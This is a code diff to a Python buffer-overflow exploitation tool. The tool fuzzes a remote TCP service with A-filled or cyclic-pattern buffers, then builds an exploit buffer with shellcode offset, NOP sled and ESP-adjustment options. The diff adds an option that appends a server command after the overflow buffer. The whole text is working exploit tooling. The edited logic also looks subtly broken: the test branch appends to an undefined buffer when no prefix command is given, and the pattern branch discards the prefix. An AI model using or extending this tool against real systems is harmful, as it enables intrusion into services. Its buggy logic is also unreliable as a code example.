@@ -18,6 +18,7 @@ test_parser.add_argument('port',type=int,help='remote port')
 test_parser.add_argument('--len',type=int,help='size of buffer to send',default=1024)
 test_parser.add_argument('--buffer-type',type=str,choices=['a','pattern'],help='type of buffer to send',default='a')
 test_parser.add_argument('--command',type=str,help='server command to prepend buffer with')
+test_parser.add_argument('--post_command',type=str,help='server command to append buffer with (remember to escape backslashes)')
 
 exploit_parser = _subparsers.add_parser('exploit',help='options for exploit')
 exploit_parser.add_argument('ip',type=str,help='ip of remote target')
@@ -30,6 +31,7 @@ exploit_parser.add_argument('--shellcodeOffset',type=int,help='offset to begin s
 exploit_parser.add_argument('--sub_esp',type=int,help='integer value to (1-9) of how many kilobytes to subtract from ESP')
 exploit_parser.add_argument('--nops',type=int,help='number of nops to place before shellcode')
 exploit_parser.add_argument('--command',type=str,help='server command to prepend buffer with')
+exploit_parser.add_argument('--post_command',type=str,help='server command to append buffer with (remember to escape backslashes)')
 
 
 query_parser = _subparsers.add_parser('q',help='query for offsets')
@@ -44,17 +46,22 @@ if __name__ == '__main__':
 	print(args)
 	if(args.cmdlet=='test'):
 		print('test')
+
+		if(args.command != None):
+			buffer = args.command.encode()+b' '
+
 		if(args.buffer_type=='a'):
-			if(args.command == None):
-				buffer=b'A'*args.len
-			else:
-				buffer = args.command.encode()+b' '+b'A'*args.len
+			buffer += b'A'*args.len
+
 
 		elif(args.buffer_type=='pattern'):
-			if(args.command==None):
-				buffer=pattern[0:args.len]
-			else:
-				buffer = args.command.encode()+b' '+pattern[0:args.len]
+			buffer=pattern[0:args.len]
+
+		if(args.post_command != None):
+			args.post_command=args.post_command.replace('\\n','\n')
+			args.post_command=args.post_command.replace('\\r','\r')
+			buffer+=args.post_command.encode()
+
 		print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))
 		try:
 			sock.connect((args.ip,args.port))
@@ -120,6 +127,11 @@ if __name__ == '__main__':
 		else:
 			print('it seems your offsets are off...try again or report a bug if you are sure...')
 			sys.exit(1)
+
+		if(args.post_command != None):
+			args.post_command=args.post_command.replace('\\n','\n')
+			args.post_command=args.post_command.replace('\\r','\r')
+			buffer+=args.post_command.encode()
 
 		print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))
 
